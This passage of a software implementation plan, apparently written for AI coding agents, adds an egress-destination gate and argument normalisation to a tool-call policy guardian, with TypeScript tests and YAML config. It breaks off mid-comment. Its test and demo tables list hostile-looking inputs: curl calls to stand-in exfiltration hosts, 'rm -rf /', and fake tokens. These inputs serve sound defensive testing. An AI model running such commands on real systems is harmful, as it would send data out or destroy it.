# V9: A second tool shape, and the egress gate — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Govern a second tool shape. One normalised policy-target leaf lets a single AGT `policy_target` serve tools whose arguments disagree about their names; AGT's stock `egress` gate then decides a `WebFetch` destination from the wire's own `url`, and a `curl` destination from a Guardian-extracted annotation, through the same unforked rule.

**Architecture:** One declaration in `mapping.yaml` (`policy_target_argument`) is read twice — once to decide which argument becomes the snapshot's `acs_policy_target` leaf, once to decide which argument an AGT `transform` is written back to. `policy/manifest.yaml` keeps its single `policy_target` and points it at that leaf. A pure Guardian-side annotator extracts a destination from `raw_command` and answers at `input.annotations.egress.destination`, which is `egress.rego`'s own fifth default path. No Rego is authored and `policy/lib` is untouched.

**Tech Stack:** Bun, TypeScript, `bun test`. AGT SDK `agent-control-specification@0.3.1-beta.0` at the ref `agt.lock` pins. OPA via the SDK. No new dependencies.

**Spec:** `docs/shaping/acs-reference-impl-slices.md` **§V9** (line 606) is authoritative for scope. Its measurements are in `docs/shaping/spike-unreached-gates.md`. Names are frozen in `slices/v9/README.md`.

## Global Constraints

Every task's requirements implicitly include this section. Constraints 1–8 are `slices/v9/README.md`'s eight commitments, restated as rules an implementer can be held to.

1. **Nothing this slice builds is named `egress` alone.** The annotator is `annotateEgressDestination()`, the file is `packages/guardian/src/annotate-egress.ts`. `egress.ts`, `Egress`, and a bare `egress` export are unavailable: they name AGT's gate, which this repository vendors byte-identical and does not author.
2. **The declaration in `mapping.yaml` is `policy_target_argument`, with members `default` and `by_tool`.** The echo of AGT's own `policy_target` is deliberate: the manifest's `policy_target` and this table name the same leaf in two dialects, exactly as `into_argument` and `into_path` already do. A third noun would hide that they are one fact.
3. **`modifications.into_argument` is removed, not kept alongside.** One declaration answers both questions — which argument the policy target is read from, and which argument a `transform` is written back to. Two declarations of one fact are two things that can disagree.
4. **The synthetic snapshot leaf is `acs_policy_target`, and it must not shadow a tool's real argument.** The `acs_` stem marks it as this side's construct rather than something a host sent. An implementation that finds a real tool argument by that name fails loudly rather than overwriting it.
5. **`resolvePolicyTargetArgument(mapping, point, toolName)` is told the tool name; it does not read an envelope.** A resolver that took an envelope would couple `map-verdict.ts` to the wire shape it currently knows nothing about.
6. **`annotateEgressDestination` answers `{destination}` or `{}`, never a throw and never `null`.** A command it cannot parse is not an error: the stock gate is `undefined` when no destination resolves, and the call falls through to the other gates. This is the slice's stated miss direction and must read as a deliberate answer in the code, not as a swallowed failure.
7. **The Guardian supplies an annotator dispatcher unconditionally once the manifest declares one.** `StartGuardianOptions.annotator` stays overridable; what changes is that omitting it no longer means "no annotator", it means "the built-in one". A test asserting a benign call is not denied under the shipped manifest is the one check in this slice whose absence would be silent.
8. **`cfg.egress` ships with an explicit `allowlist`.** With the key absent, `allowlist(rules)` falls back to `input.tool.security_labels`, which is `["shell"]` on every registered tool, and every destination is denied.
9. **`policy/lib/*.rego` is never edited.** `bun run verify:pin` byte-diffs every `.rego` against the pinned upstream clone. `policy/lib/data.json` is this project's own file and is the one thing in that directory this slice may change (`test/pin.test.ts` — "adds nothing to the bundle except data.json").
10. **Every comment and document sentence states a measured fact.** Captured output is re-run, never hand-edited.
11. **Comments and test names carry no shaping identifiers** (`N54`, `S17`, `R1.11`, …) and no review archaeology. Name the function, the file, or the behaviour in words. Standing rule across the stack.
12. **`trash`, never `rm -rf`.** **No attribution on outbound traffic** from any script this slice touches.

---

## Slice Contract

| Field | Value |
|---|---|
| **Slice ID** | GitHub issue **#28** — "V9: A second tool shape, and the egress gate" |
| **Slices doc** | `docs/shaping/acs-reference-impl-slices.md` **§V9, line 606** |
| **Frozen names** | `slices/v9/README.md` |
| **Measurements** | `docs/shaping/spike-unreached-gates.md` §A1, §A2, §A3, §A7, §A8 |
| **Branch** | `slice/v9`, stacked on `slice/v8` (PR **#30** → `slice/v8`) |
| **Demo** | "Ask for a web fetch of a host the allowlist does not cover. AGT's stock `egress` gate denies it — a fourth gate class live, from one `data.json` key and no code. Then ask for the same destination over `curl`, and it denies again, this time from a Guardian-extracted destination. Both verdicts come from the same unforked rule." |
| **Components** | **N54** `resolvePolicyTargetArgument()` · **N55** `annotateEgressDestination()` · **N23** `assemblePreToolCallSnapshot()` +3rd param · **N24** `mapVerdict()` +4th param · **N21** `validateEnvelope()` (already types `raw_command`) · **N31** bridge always built with a dispatcher · **N30** `evaluateInterventionPoint` dispatches the annotator · **N2/N11** `buildEnvelope()` reads the new `raw_command` path · **S17** `settings.json` matchers · **S10** `mapping.yaml` · **S7** `policy/manifest.yaml` · **S8** `data.agt.defaults.config` · **S1/S2** both hookmaps |
| **UI** | None new. The denial renders through **U2**, **U11**, **U20**, **U21** — a deny is a deny, and the decision badge already renders whatever `reason_codes` comes back |
| **Requirements** | **R1.9** every gate class reachable or a named reason · **R1.10** a second tool shape evaluated, and a transform landing on that tool's own argument · **R1.11** egress decided for the tool the threat actually uses · **R2.1** AGT's published library deciding, driven only by configuration |
| **Not in this slice** | The result gate's own one-shape assumption (`outputs.from`, one path per hook) — risk row 24, **explicitly unassigned** · the six posture-seam hookmap faults · Inspector tail-test sleeps |

---

## Corrections produced during planning

Each was measured by running the pinned SDK against the vendored bundle during planning, not by reading documentation. Each is amended into `docs/shaping/acs-reference-impl-slices.md` §V9 by Task 6.

### C1 — `annotations.<name>.from` is a liveness precondition, not a projection, and an unresolvable one is a total deny

§A8 measured that an annotator declared with **no dispatcher** denies every call. Planning measured the neighbouring fault, which §A8 does not cover and which V9 walks straight into: what a *dispatched* annotator does when its declared `from` path is **absent from the snapshot**.

Measured, on one manifest with `annotations.egress.from: "$.tool_call.raw_command"` and a `WebFetch` snapshot carrying no `raw_command`:

```
WebFetch allowlisted (NO raw_command)     -> {"decision":"deny","reason":"runtime_error:path_missing","message":"Request blocked by Agent Control Specification."}
  annotator calls: []
WebFetch off-allowlist (NO raw_command)   -> same
  annotator calls: []
WebFetch, raw_command as empty string     -> {"decision":"allow","result_labels":["public"]}
  annotator calls: [ … one call … ]
```

Three facts follow, and all three change the implementation:

1. **The annotator is never called** when `from` does not resolve. The SDK resolves the path first and fails closed.
2. **`from` is required** — a manifest declaring `annotations: {egress: {}}` does not parse: *"intervention_points.pre_tool_call.annotations.egress: missing field `from`"*. So "just omit `from`" is not available.
3. **The resolved value never reaches the dispatcher.** The dispatcher's `config` argument is the annotator's declaration — `{"from":"$.tool_call.raw_command","type":"classifier"}`, the *path*, not the value — and `preliminary` is AGT's whole preliminary policy input document: `{intervention_point, policy_target, snapshot, annotations, tool}`.

**Consequences.** `assemblePreToolCallSnapshot` must write `raw_command` on **every** request snapshot, as the empty string when the wire carries none — otherwise every `WebFetch` call is a total deny wearing a runtime-error reason, which is the exact failure §A8 warns about arriving from a second direction. And `annotateEgressDestination` reads the command out of `preliminary.snapshot.tool_call.raw_command` itself; it cannot be handed the projected value, because there is no projection.

### C2 — the `guardian_only` / `expressed` matrix-cell claim is not implementable, and V8 already set the right precedent

§V9 and `slices/v9/README.md` both say the two egress routes take different cells in V7's matrix: the `url` route `expressed`, the `raw_command` route `guardian_only`.

**Measured against the shipped code:** V7's matrix is **8 AGT intervention points × 5 AGT verdicts = 40 cells**, and both axes are read off the pinned SDK's own `InterventionPoint` and `Decision` consts (`packages/conformance/src/cells.ts`). There is no coordinate for a gate class, and none for a route. `pre_tool_call × deny` already resolves `expressed`, from the patterns gate, via `failure-domains.ts`. An egress deny at that same coordinate adds no cell and changes no status.

**Consequence, and it is a scope reduction, not a workaround.** V9 does **not** touch `packages/conformance`. The two-provenance distinction is stated where it is true — in the runbook and in §V9 — and not encoded as a cell the matrix cannot hold. This is V8's own rule applied again: *"A `SurfaceDiff` is not a cell of V7's 8 × 5"*. Encoding it anyway would mean widening the matrix's axes to carry a third dimension nothing else measures, which is a slice of its own.

### C3 — two resolvable destination paths are a runtime error, not a priority order

`egress.rego`'s `destination(rules)` is a complete rule over `some path in paths`. Handed a snapshot where **two** of its five paths resolve to **different** strings, OPA has no single value to answer with.

Measured — a snapshot carrying both `args.url: "https://docs.anthropic.com/a"` and an annotation destination of `https://exfil.test/b`:

```
CONFLICT PROBE: url AND a different raw_command url -> {"decision":"deny","reason":"runtime_error:policy_invocation_failed","message":"Request blocked by Agent Control Specification."}
```

**Consequence.** `annotateEgressDestination` must answer `{}` whenever the snapshot's own arguments already carry a destination AGT reads — `url`, `endpoint`, `host`, `domain`. Not reachable across the two tools this slice governs (`WebFetch` sends `url` and an empty `raw_command`; `Bash` sends `command` and a populated one), and reachable on the first tool registered that sends both. Handled structurally in the annotator, with its own test, rather than left to the tool set staying small.

### C4 — the whole demo matrix on one manifest, measured

The eight rows the runbook will capture, evaluated through the pinned bundle on a single manifest with the normalised leaf, the annotator wired, and `cfg.egress` carrying an explicit allowlist:

| Tool | Policy target | Verdict |
|---|---|---|
| `Bash` | `echo hi` | `allow`, `result_labels: ["public"]` |
| `Bash` | `rm -rf /` | `deny` `destructive_shell_command_blocked` |
| `Bash` | `curl https://exfil.test/steal` | `deny` `egress_destination_not_allowed` — *"destination exfil.test not in allowlist …"* |
| `Bash` | `curl https://docs.anthropic.com/x` | `allow` |
| `Bash` | `echo ghp_ABCDEF123456` | `transform` → `echo [REDACTED]` |
| `WebFetch` | `https://docs.anthropic.com/x` | `allow` |
| `WebFetch` | `https://exfil.attacker.test/steal` | `deny` `egress_destination_not_allowed` |
| `WebFetch` | `https://docs.anthropic.com/?t=ghp_ABCDEF123456` | `transform` → `https://docs.anthropic.com/?t=[REDACTED]` |

All four live gate classes coexist on one shared leaf with no false positive in either direction, confirming §A7 against the exact manifest this slice ships rather than against the spike's probe.

### C5 — OpenCode's fetch tool is `webfetch` and its argument is `url`, with different evidence for each half

The **name** is measured: §V5's live run through a Guardian recorded `read / grep / write / edit / webfetch -> deny runtime_error:path_missing`, which is OpenCode reporting its own tool names.

The **argument key** is read out of the shipped `opencode` 1.18.18 binary's own tool renderer (`t.input.url`), which is evidence about the tool's input shape but is not a live measurement of what lands in the plugin's `args`. ⚠️ Task 5 measures it live before the `by_tool` row is trusted, and records what it saw.

---

## Slice accounting

| From the slice | Handled by | Note |
|---|---|---|
| N54 `resolvePolicyTargetArgument()` | Task 1 | told the tool name, never an envelope |
| S10 `mapping.yaml` gains `policy_target_argument`, loses `into_argument` | Task 1 | one declaration, read twice |
| N24 `mapVerdict()` fourth parameter | Task 1 | closes risk row 19 structurally |
| `summaries.redaction_applied.pre_tool_call` wording | Task 1 | "this command" is wrong for every non-shell tool |
| N23 `assemblePreToolCallSnapshot()` third parameter | Task 1 | writes `acs_policy_target`, always writes `raw_command` |
| S7 `policy/manifest.yaml` `policy_target` + `tools:` | Task 1 | single target, pointed at the leaf |
| `test/path-dialects.test.ts` splits into two agreements | Task 1 | the old derivation would now yield the leaf's own name |
| N55 `annotateEgressDestination()` | Task 2 | pure, total, `{}` on anything it cannot parse |
| N21 `raw_command` first populated | Task 3 | already typed at `validate-envelope.ts:100` since V1 |
| S1/S2 hookmaps gain `raw_command` | Task 3 | omitted when unresolvable, never a throw |
| N2/N11 `buildEnvelope()` reads it | Task 3 | one function, both hosts |
| S8 `cfg.egress` with an explicit allowlist | Task 4 | commitment 8; risk row 21 |
| N31 bridge always constructed with a dispatcher | Task 4 | commitment 7; risk row 20 |
| N30 dispatches the annotator | Task 4 | the SDK's own seam, already built |
| S17 `settings.json` PreToolUse matcher | Task 5 | request gate only — risk row 24's bounded half |
| S2 `tools:` gains OpenCode's fetch tool | Task 5 | with C5's live verification |
| R1.10 transform lands on the right argument | Task 1 | the end-to-end test for risk row 19: `parameter_overrides.url`, and no `command` key |
| R1.9 / R1.11 / R2.1 | Task 6 | declared in the runbook against captured output |
| Corrections C1–C5 | Task 6 | amended into §V9 |
| V7 matrix cells | **not in this plan** | C2: the matrix has no coordinate for a route |
| Result gate's `outputs.from` one-shape assumption | **not in this plan** | risk row 24, explicitly unassigned |

---

## File structure

| File | Created / Modified | Responsibility |
|---|---|---|
| `mapping.yaml` | Modified | declares `policy_target_argument.{default,by_tool}`; `into_argument` removed |
| `packages/guardian/src/map-verdict.ts` | Modified | `resolvePolicyTargetArgument()`; `mapVerdict` takes the resolved argument |
| `packages/guardian/src/assemble-snapshot.ts` | Modified | writes the `acs_policy_target` leaf and an always-present `raw_command` |
| `packages/guardian/src/annotate-egress.ts` | **Created** | the destination extractor: `{destination}` or `{}`, never a throw |
| `packages/guardian/src/server.ts` | Modified | resolves the argument before assembling; supplies the built-in dispatcher |
| `packages/guardian/src/index.ts` | Modified | exports the resolver (the conformance package reads it) |
| `policy/manifest.yaml` | Modified | `policy_target` → the leaf; two tools registered; the annotator declared |
| `policy/lib/data.json` | Modified | `cfg.egress` with an explicit allowlist. **The only file in `policy/lib` this slice may touch** |
| `packages/host-adapter/src/build-envelope.ts` | Modified | reads a hookmap's `raw_command` path onto the request payload |
| `hosts/claude-code/claude-code.hookmap.yaml` | Modified | `raw_command: $.tool_input.command` |
| `hosts/opencode/opencode.hookmap.yaml` | Modified | `raw_command: $.args.command`; request gate's `tools:` widens |
| `.claude/settings.json`, `hosts/claude-code/settings.json` | Modified | PreToolUse matcher widens; PostToolUse does not |
| `packages/conformance/src/verdicts.ts` | Modified | its `mapVerdict` call gains the fourth argument |
| `test/path-dialects.test.ts` | Modified | splits into the two agreements that are load-bearing now |
| `packages/guardian/test/annotate-egress.test.ts` | **Created** | |
| `docs/demos/v9-runbook.md` | **Created** | captured, never hand-edited |

---


## Task 1: The normalised leaf, and one declaration read twice · slice #28 · N54, N24, N23, S10, S7

`mapping.yaml` declares, per intervention point, which argument each tool's policy target lives in. The Guardian copies that argument's value to one fixed snapshot leaf, and `policy/manifest.yaml`'s single `policy_target` points at the leaf. The **same** declaration decides which argument an AGT `transform` is written back to, so the two can never disagree — `into_argument` is removed, not deprecated beside it.

**This is one task because no half of it runs.** Removing `into_argument` breaks `mapVerdict`; moving the manifest's `policy_target` to a leaf nothing writes denies every call on `runtime_error:path_missing`; writing the leaf while the manifest still targets `command` changes nothing. A reviewer cannot accept one half and reject the other, which is the test for where a task boundary belongs.

**Files:**
- Modify: `mapping.yaml`
- Modify: `packages/guardian/src/map-verdict.ts`
- Modify: `packages/guardian/src/assemble-snapshot.ts`
- Modify: `packages/guardian/src/server.ts` (`evaluateStep`, and the assembler's parameter type)
- Modify: `packages/guardian/src/index.ts`
- Modify: `policy/manifest.yaml`
- Modify: `packages/conformance/src/verdicts.ts:181`
- Test: `packages/guardian/test/map-verdict.test.ts`, `packages/guardian/test/assemble-snapshot.test.ts`, `test/path-dialects.test.ts`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces:
  - `resolvePolicyTargetArgument(mapping: Mapping, point: string, toolName: string): string | undefined` — `undefined` for a point that declares no table; throws for a point the table has no row for at all.
  - `mapVerdict(verdict: AgtVerdict, mapping: Mapping, point: string, policyTargetArgument: string | undefined): AcsDecision` — fourth parameter required in position, nullable in value, so every caller decides.
  - `assemblePreToolCallSnapshot(envelope: ToolCallRequestEnvelope, sourceLabels: IfcLabels, policyTargetArgument: string | undefined): AgtPreToolCallSnapshot`.
  - `POLICY_TARGET_LEAF = "acs_policy_target"`, exported from `assemble-snapshot.ts` and from the package barrel.
  - `AgtPreToolCallSnapshot.tool_call.raw_command: string` — always present.
  - `type PolicyTargetArgument = { default: string; by_tool?: Record<string, string> }`.

- [ ] **Step 1: Write the failing tests — the resolver and the rewrite target**

Append to `packages/guardian/test/map-verdict.test.ts`. Add `loadMapping` and `resolvePolicyTargetArgument` to that file's existing import from `../src/map-verdict.ts`.

```ts
describe("which argument a tool's policy target is read from", () => {
  const shipped = loadMapping("mapping.yaml");

  it("answers the argument the table names for that tool", () => {
    expect(resolvePolicyTargetArgument(shipped, "pre_tool_call", "WebFetch")).toBe("url");
    expect(resolvePolicyTargetArgument(shipped, "pre_tool_call", "Bash")).toBe("command");
  });

  it("falls back to the default for a tool the table does not name", () => {
    expect(resolvePolicyTargetArgument(shipped, "pre_tool_call", "SomeToolNobodyRegistered")).toBe("command");
  });

  it("answers nothing for a gate that rewrites a payload leaf rather than an argument", () => {
    expect(resolvePolicyTargetArgument(shipped, "post_tool_call", "Bash")).toBeUndefined();
  });

  it("throws for a point the mapping has no row for at all", () => {
    expect(() => resolvePolicyTargetArgument(shipped, "not_a_point", "Bash")).toThrow(/no row/);
  });

  it("throws when the table names neither a default nor an entry for this tool", () => {
    const broken = {
      intervention_points: {
        pre_tool_call: { acs_method: "steps/toolCallRequest", policy_target_argument: { by_tool: { Bash: "command" } } },
      },
    } as unknown as Mapping;
    expect(() => resolvePolicyTargetArgument(broken, "pre_tool_call", "WebFetch")).toThrow(/default/);
  });
});

describe("a rewrite lands on the argument the tool actually sent it in", () => {
  const shipped = loadMapping("mapping.yaml");
  const redaction: AgtVerdict = {
    decision: "transform",
    reason: "redaction_applied",
    transform: { path: "$policy_target", value: "https://docs.anthropic.com/?t=[REDACTED]" },
  };

  it("keys the parameter override by the resolved argument, not by a literal", () => {
    expect(mapVerdict(redaction, shipped, "pre_tool_call", "url").modifications).toEqual({
      parameter_overrides: { url: "https://docs.anthropic.com/?t=[REDACTED]" },
    });
  });

  it("keys a shell rewrite the same way, from the same declaration", () => {
    expect(mapVerdict(redaction, shipped, "pre_tool_call", "command").modifications).toEqual({
      parameter_overrides: { command: "https://docs.anthropic.com/?t=[REDACTED]" },
    });
  });

  it("refuses to report a rewrite with no argument to land it on", () => {
    expect(() => mapVerdict(redaction, shipped, "pre_tool_call", undefined)).toThrow(/policy_target_argument/);
  });

  it("leaves the result gate's redaction pointer alone -- it addresses a payload leaf, not an argument", () => {
    expect(mapVerdict(redaction, shipped, "post_tool_call", undefined).modifications).toEqual({
      redactions: [{ path: "/outputs/0/value", replacement: "https://docs.anthropic.com/?t=[REDACTED]" }],
    });
  });
});
```

- [ ] **Step 2: Write the failing tests — the snapshot leaf, and the rewrite that lands on it**

Append to `packages/guardian/test/assemble-snapshot.test.ts`. That file already builds request envelopes; if its existing helper does not take an arbitrary arguments bag plus an optional raw command, add this local one:

```ts
function requestEnvelope(
  toolName: string,
  args: Record<string, unknown>,
  rawCommand?: string,
): ToolCallRequestEnvelope {
  const payload: Record<string, unknown> = {
    tool: { name: toolName },
    arguments: Object.fromEntries(Object.entries(args).map(([k, v]) => [k, { value: v }])),
  };
  if (rawCommand !== undefined) payload.raw_command = rawCommand;
  return {
    jsonrpc: "2.0",
    method: "steps/toolCallRequest",
    id: 1,
    params: {
      acs_version: "0.1.0",
      request_id: "11111111-1111-4111-8111-111111111111",
      timestamp: "2026-08-18T00:00:00Z",
      metadata: { session_id: "22222222-2222-4222-8222-222222222222" },
      payload,
    },
  } as unknown as ToolCallRequestEnvelope;
}
```

```ts
describe("one fixed snapshot leaf, whatever the tool calls its argument", () => {
  it("copies the named argument's value to the leaf the manifest targets", () => {
    const snapshot = assemblePreToolCallSnapshot(
      requestEnvelope("WebFetch", { url: "https://docs.anthropic.com/x" }),
      ["public"],
      "url",
    );
    expect(snapshot.tool_call.args[POLICY_TARGET_LEAF]).toBe("https://docs.anthropic.com/x");
  });

  it("leaves the tool's own argument in place beside it", () => {
    const snapshot = assemblePreToolCallSnapshot(
      requestEnvelope("WebFetch", { url: "https://docs.anthropic.com/x" }),
      ["public"],
      "url",
    );
    expect(snapshot.tool_call.args.url).toBe("https://docs.anthropic.com/x");
  });

  it("does the same for a shell tool, from the same one declaration", () => {
    const snapshot = assemblePreToolCallSnapshot(requestEnvelope("Bash", { command: "echo hi" }), ["public"], "command");
    expect(snapshot.tool_call.args[POLICY_TARGET_LEAF]).toBe("echo hi");
  });

  it("refuses a tool that already sends an argument by the leaf's own name, rather than overwriting it", () => {
    expect(() =>
      assemblePreToolCallSnapshot(
        requestEnvelope("Bash", { command: "echo hi", [POLICY_TARGET_LEAF]: "something the host sent" }),
        ["public"],
        "command",
      ),
    ).toThrow(/acs_policy_target/);
  });

  it("refuses a call missing the argument its policy target was declared to live in", () => {
    expect(() =>
      assemblePreToolCallSnapshot(requestEnvelope("Bash", { script: "echo hi" }), ["public"], "command"),
    ).toThrow(/"command"/);
  });

  it("refuses to assemble at all when the mapping declares no argument for this gate", () => {
    expect(() =>
      assemblePreToolCallSnapshot(requestEnvelope("Bash", { command: "echo hi" }), ["public"], undefined),
    ).toThrow(/policy_target_argument/);
  });
});

describe("the raw command is always on the snapshot, present or empty", () => {
  it("carries what the envelope sent", () => {
    const snapshot = assemblePreToolCallSnapshot(
      requestEnvelope("Bash", { command: "curl https://exfil.test/x" }, "curl https://exfil.test/x"),
      ["public"],
      "command",
    );
    expect(snapshot.tool_call.raw_command).toBe("curl https://exfil.test/x");
  });

  // A manifest-declared annotator's own `from` path must resolve or AGT denies
  // the whole call on runtime_error:path_missing before the annotator is ever
  // dispatched -- measured, with zero annotator calls. An absent raw_command
  // would therefore make every fetch a total deny wearing a runtime-error
  // reason.
  it("carries an empty string when the envelope sent none", () => {
    const snapshot = assemblePreToolCallSnapshot(
      requestEnvelope("WebFetch", { url: "https://docs.anthropic.com/x" }),
      ["public"],
      "url",
    );
    expect(snapshot.tool_call.raw_command).toBe("");
  });
});
```

And the end-to-end half, appended to `packages/guardian/test/server.test.ts`. This is the defect the whole slice exists to close, and it is red **only** before this task: measured through the shipped `mapVerdict` beforehand, the same verdict came back as `parameter_overrides.command` — a key `WebFetch` has no argument for — while `url`, still carrying the token, was delivered untouched.

```ts
describe("a redaction lands on the argument the tool actually sent", () => {
  it("rewrites the fetch's url, and names no argument the tool does not have", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "WebFetch", {
        url: "https://docs.anthropic.com/?t=ghp_ABCDEF123456",
      });
      expect(decision.decision).toBe("modify");
      expect(decision.modifications).toEqual({
        parameter_overrides: { url: "https://docs.anthropic.com/?t=[REDACTED]" },
      });
      expect(Object.keys(decision.modifications?.parameter_overrides ?? {})).not.toContain("command");
    } finally {
      await guardian.close();
    }
  });

  it("still rewrites a shell command's own argument, from the same declaration", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "Bash", { command: "echo ghp_ABCDEF123456" });
      expect(decision.modifications).toEqual({ parameter_overrides: { command: "echo [REDACTED]" } });
    } finally {
      await guardian.close();
    }
  });
});
```

⚠️ *`postToolCallRequest(guardian, toolName, args, extraPayload?)` is a helper to add beside that file's existing ones if it has no equivalent: it posts a `steps/toolCallRequest` envelope and returns the decision off the final result. The optional fourth parameter is what puts `raw_command` on the payload, which Task 4 needs.*

- [ ] **Step 3: Run both test files to verify they fail**

Run: `bun test packages/guardian/test/map-verdict.test.ts packages/guardian/test/assemble-snapshot.test.ts packages/guardian/test/server.test.ts`
Expected: FAIL — `resolvePolicyTargetArgument is not a function`, `POLICY_TARGET_LEAF` not exported, the snapshot assertions failing on a missing leaf and a missing `raw_command`, and the fetch's redaction arriving as `parameter_overrides.command`.

- [ ] **Step 4: Declare the table in `mapping.yaml`**

Replace the `pre_tool_call` row's `modifications` block and the comment above it. The comment is rewritten rather than amended: the old one told a reader that `into_argument` "must agree with `policy/manifest.yaml`'s pre_tool_call policy_target", and after this task it does not — the manifest names a synthetic leaf and this table names host arguments.

```yaml
intervention_points:
  pre_tool_call:
    acs_method: "steps/toolCallRequest"
    # Which argument this gate's policy target lives in, per tool.
    #
    # AGT's manifest gives an intervention point exactly ONE policy_target
    # (manifest.schema.json declares intervention_point with
    # additionalProperties: false), and AGT resolves that path before any rule
    # runs. Measured: a WebFetch call under a target of
    # "$.tool_call.args.command" is DENIED on runtime_error:path_missing --
    # not evaluated and allowed; denied, with no rule consulted. So a
    # deployment governing two tools whose arguments disagree about their names
    # cannot express both with one literal path.
    #
    # The answer is this table plus a normalised leaf. The Guardian reads the
    # argument named here, copies its value to the fixed snapshot leaf
    # policy/manifest.yaml's policy_target points at, and every gate stays live
    # in one Guardian -- the property a second manifest per gate would have
    # cost.
    #
    # THE SAME ENTRY IS READ A SECOND TIME, and that is the whole reason it is
    # one entry. AGT's transform names the leaf it rewrote by the literal
    # "$policy_target"; ACS expresses that as modifications.parameter_overrides
    # keyed by ARGUMENT NAME (modifications.json: "Replacement values for tool
    # call arguments, keyed by argument name"). The argument a target is read
    # FROM and the argument an override is written TO are the same argument.
    # That used to be a second declaration (`into_argument: command`), and with
    # one governed tool the two could not disagree. Widening to a second tool is
    # exactly when they can: measured through the shipped mapVerdict, a
    # redaction of a WebFetch url came out as parameter_overrides.command -- a
    # key the tool has no argument for -- while url, still carrying the secret,
    # shipped untouched. One entry read twice cannot do that.
    #
    # `default` is what an unlisted tool gets. A tool listed here that
    # policy/manifest.yaml does not register is a failing case in
    # test/path-dialects.test.ts.
    policy_target_argument:
      default: command
      by_tool:
        run_shell: command
        Bash: command
        bash: command
        WebFetch: url
        webfetch: url
    modifications:
      from: verdict.transform
      when_path: "$policy_target"
      into: parameter_overrides
```

And the wording fix in `field_synthesis.reasoning.summaries` — the old sentence is wrong for every non-shell tool, and it is the sentence a model reads:

```yaml
      redaction_applied:
        pre_tool_call: "A secret in this step's arguments was replaced before it ran."
        post_tool_call: "Secrets in this output were replaced before the model saw them."
```

- [ ] **Step 5: Implement the resolver and rewire `mapVerdict`**

In `packages/guardian/src/map-verdict.ts` — `into_argument` goes from the type:

```ts
type ModificationsRule =
  | {
      from: string;
      when_path: string;
      /** The request gate rewrites a tool ARGUMENT. WHICH argument is not
       * declared here: it is `policy_target_argument` on the same row, because
       * the argument an override lands on is the argument the policy target was
       * read from, and one fact declared twice is two things that can
       * disagree. */
      into: "parameter_overrides";
    }
  | {
      from: string;
      when_path: string;
      /** The result gate rewrites the result payload's own leaf, addressed by
       * an ACS JSON pointer the mapping supplies. */
      into: "redactions";
      into_path: string;
    };

/** Which argument a tool's policy target lives in, for one intervention
 * point. `default` covers every tool `by_tool` does not name. */
type PolicyTargetArgument = { default: string; by_tool?: Record<string, string> };

type InterventionPoint = {
  acs_method: string | null;
  note?: string;
  policy_target_argument?: PolicyTargetArgument;
  modifications?: ModificationsRule;
};
```

The resolver, beside `resolveInterventionPoint` and reading the same table:

```ts
/**
 * Which argument this tool's policy target is read from, at this point.
 *
 * Told the tool NAME, never an envelope. Its callers already hold the name --
 * the Guardian reads `payload.tool.name` for the session chain entry two
 * statements earlier -- and a resolver that took an envelope would couple this
 * module to the wire shape it currently knows nothing about.
 *
 * Answers `undefined` for a point that declares no table, which is the honest
 * answer for the result gate: that gate rewrites a leaf of the result payload
 * addressed by JSON pointer, and no tool argument is involved. A point the
 * table has no row for at all is a different thing and throws, for the same
 * reason `resolveInterventionPoint` throws rather than defaulting -- a mapping
 * that cannot answer must say so rather than guess.
 */
export function resolvePolicyTargetArgument(
  mapping: Mapping,
  point: string,
  toolName: string,
): string | undefined {
  const row = mapping.intervention_points?.[point];
  if (row === undefined) {
    throw new Error(
      `mapping.yaml's intervention_points table has no row for AGT intervention point "${point}", so the ` +
        `argument its policy target is read from cannot be resolved`,
    );
  }

  const table = row.policy_target_argument;
  if (table === undefined) {
    return undefined;
  }

  const named = table.by_tool?.[toolName];
  if (typeof named === "string") {
    return named;
  }

  if (typeof table.default !== "string") {
    throw new Error(
      `mapping.yaml's intervention_points.${point}.policy_target_argument names no argument for tool ` +
        `${JSON.stringify(toolName)} and declares no usable "default"`,
    );
  }
  return table.default;
}
```

`synthesizeModifications` gains the argument and keys the override by it. Every check above it — the missing-rule throw, the absent-transform throw, the `when_path` check — is unchanged:

```ts
function synthesizeModifications(
  verdict: AgtVerdict,
  mapping: Mapping,
  point: string,
  policyTargetArgument: string | undefined,
): AcsModifications {
  // … existing rule / transform / when_path checks unchanged …

  const declaredInto: string = rule.into;
  if (rule.into === "parameter_overrides") {
    // A rewrite with no argument to land on is the one thing this function
    // exists not to produce: a modification reported applied while the
    // original ships. The Guardian's evaluation catch turns this throw into an
    // honoured deny.
    if (policyTargetArgument === undefined) {
      throw new Error(
        `mapping.yaml maps this verdict into an ACS parameter override, but its intervention_points row ` +
          `for "${point}" declares no policy_target_argument, so there is no argument for the rewrite to ` +
          `land on`,
      );
    }
    return { [rule.into]: { [policyTargetArgument]: transform.value } };
  }
  // … redactions branch and final throw unchanged …
}
```

And `mapVerdict`:

```ts
export function mapVerdict(
  verdict: AgtVerdict,
  mapping: Mapping,
  point: string,
  policyTargetArgument: string | undefined,
): AcsDecision {
  // … unchanged until:
  if (rule.decision === "modify") {
    out.modifications = synthesizeModifications(verdict, mapping, point, policyTargetArgument);
  }
  return out;
}
```

- [ ] **Step 6: Write the leaf and the raw command into the snapshot**

In `packages/guardian/src/assemble-snapshot.ts`:

```ts
/**
 * The one snapshot leaf every tool's policy target is copied to.
 *
 * `policy/manifest.yaml`'s pre_tool_call `policy_target` names this, and
 * mapping.yaml's `policy_target_argument` names the per-tool argument it is
 * copied FROM. The `acs_` stem marks it as this side's construct rather than
 * something a host sent, which is what stops a reader taking it for an
 * argument some tool declared.
 */
export const POLICY_TARGET_LEAF = "acs_policy_target";
```

The snapshot type gains one always-present member:

```ts
export type AgtPreToolCallSnapshot = {
  envelope: { budgets: AgtSnapshotBudgets };
  tool_call: {
    name: string;
    args: Record<string, unknown>;
    id: string;
    /**
     * ACS's own `raw_command`, and ALWAYS present -- the empty string when the
     * wire carried none.
     *
     * Not a convenience. A manifest-declared annotator's `annotations.<name>
     * .from` path must resolve or AGT denies the entire call with
     * runtime_error:path_missing BEFORE dispatching the annotator -- measured,
     * with zero annotator calls -- so a snapshot that omitted this member for
